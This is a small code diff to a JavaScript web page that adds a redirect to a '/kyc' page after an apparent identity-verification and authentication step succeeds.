@@ -10,6 +10,9 @@ export const encryptStorage = new EncryptStorage(
   }
 );
 
+const nextPage = () => {
+  window.location.href = "/kyc";
+};
 const button = document.getElementById("sendNice");
 const checkbox = document.getElementById("privacyCheckbox");
 
@@ -114,6 +117,7 @@ const fnCheckAuth = () => {
   } else if (sessionStorage.getItem("cust_key") !== "") {
     fnSendData(encrypted);
     sendNateon(res_name, cust_key);
+    nextPage();
   }
 };
 
